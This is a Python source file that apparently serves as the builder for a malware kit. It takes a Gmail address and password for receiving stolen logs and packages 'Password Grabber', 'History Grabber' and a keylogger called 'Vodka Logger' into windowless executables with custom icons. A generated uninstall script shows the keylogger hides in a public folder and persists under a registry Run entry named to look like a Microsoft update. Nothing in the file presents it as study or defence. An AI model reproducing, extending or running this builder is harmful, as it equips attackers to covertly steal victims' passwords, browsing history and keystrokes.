import os

def clear():
    """
    Clears the terminal screen.

    On Windows, it uses the 'cls' command.
    """
    os.system('cls')

def begin():
    """
    Prompts the user for email credentials and confirms the input.

    This function clears the screen, displays warnings and notes, and prompts the user
    to input their email and password. It then confirms the input with the user.

    Returns:
        tuple: A tuple containing the email and password if the user confirms the input.
    """
    clear()
    print('\n WARNING: Enable access to less secure apps on your email account. \n -> * ONLY WORK WITH GMAIL * \n TUTORIAL -> https://www.youtube.com/watch?v=g_j6ILT-X0k')
    print('\n NOTE: Don\'t use your personal email, make a dedicated.')
    print('\n This keylogger send logs when logs > 750 chars or each 240 seconds.\n')
    email = input('Type your email to receive logs: ')
    epass = input('Type your email password: ')
    print('\n')
    print('[ ################################################# ]')
    print('\n   email: ' + email)
    print('   password: ' + epass)
    print('\n[ ################################################# ]')
    print('\n')
    ask = input('These info above is correct? (y/n) :')
    if ask.lower() == 'y':
        print("Credentials saved successfully.")
        return email, epass
    else:
        begin()

class Generator:
    """
    A class to generate various types of executable files.

    Attributes:
        email (str): The email address to be used in the generated executables.
        password (str): The password for the email account.
        name (str): The name of the generated executable.
        icon_path (str, optional): The path to the icon file for the executable.
    """

    def __init__(self, email, password, name, icon_path=None):
        """
        Constructs all the necessary attributes for the Generator object.

        Args:
            email (str): The email address to be used in the generated executables.
            password (str): The password for the email account.
            name (str): The name of the generated executable.
            icon_path (str, optional): The path to the icon file for the executable.
        """
        self.email = email
        self.password = password
        self.name = name
        self.icon_path = icon_path

    def password_grabber_generator(self):
        """
        Generates a Password Grabber executable.

        This method creates a temporary Python script, uses PyInstaller to generate
        an executable, and then cleans up the temporary files.
        """
        with open("temporary.py", "w") as temp:
            with open("PasswordGrabber/main.py") as main:
                payload = f"{main.read()}\n    main('{self.email}', '{self.password}')"
                temp.write(payload)
        os.system("pyinstaller temporary.py -F -w" + f" --icon={self.icon_path}" if self.icon_path is not None else "")
        os.system('del /f /q temporary.spec temporary.py')
        os.system('rmdir /s /q build')
        os.rename("dist/temporary.exe", f"dist/{self.name}.exe")
        clear()
        print(f"successfully generated Password Grabber as {self.name}.exe")
        print("You can find it in the dist folder.")

    def history_grabber_generator(self):
        """
        Generates a History Grabber executable.

        This method creates a temporary Python script, uses PyInstaller to generate
        an executable, and then cleans up the temporary files.
        """
        with open("temporary.py", "w") as temp:
            with open("HistoryGrabber/main.py") as main:
                payload = f"{main.read()}\n    main('{self.email}', '{self.password}')"
                temp.write(payload)
        os.system("pyinstaller temporary.py -F -w" + f" --icon={self.icon_path}"if self.icon_path is not None else "")
        os.system('del /f /q temporary.spec temporary.py')
        os.system('rmdir /s /q build')
        os.rename("dist/temporary.exe", f"dist/{self.name}.exe")
        clear()
        print(f"successfully generated History Grabber as {self.name}.exe")
        print("You can find it in the dist folder.")

    def vodka_logger_generator(self):
        """
        Generates a Vodka Logger (keylogger) executable.

        This method creates a temporary Python script, uses PyInstaller to generate
        an executable, and then cleans up the temporary files.
        """
        with open("temporary.py", "w") as temp:
            with open("VodkaLogger/main.py") as main:
                payload = (f'{main.read()}\n'
                           f'logger = VodkaLogger(email="{self.email}", password="{self.password}", name="{self.name}", char_limit=1000)')
                temp.write(payload)
        os.system("pyinstaller temporary.py -F -w" + f" --icon={self.icon_path}" if self.icon_path is not None else "")
        os.system('del /f /q temporary.spec temporary.py')
        os.system('rmdir /s /q build')
        os.rename("dist/temporary.exe", f"dist/{self.name}.exe")
        clear()
        print(f"successfully generated Vodka Logger (keylogger) as {self.name}.exe")
        print("You can find it in the dist folder.")

    def uninfectme_generator(self):
        """
        Generates a batch script to remove the Vodka Logger executable and its registry entry.

        This method creates a batch script that kills the Vodka Logger process, deletes the executable,
        and removes its entry from the Windows startup registry.
        """
        with open("dist\\unInfect.bat", "w") as f:
            f.write(rf"""
            taskkill /f /im "{self.name}.exe"
            del /q C:\Users\Public\Libraries\{self.name}.exe
            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftUpdateXX  /f
            cls
            echo "[*] DONE "
            pause
            """)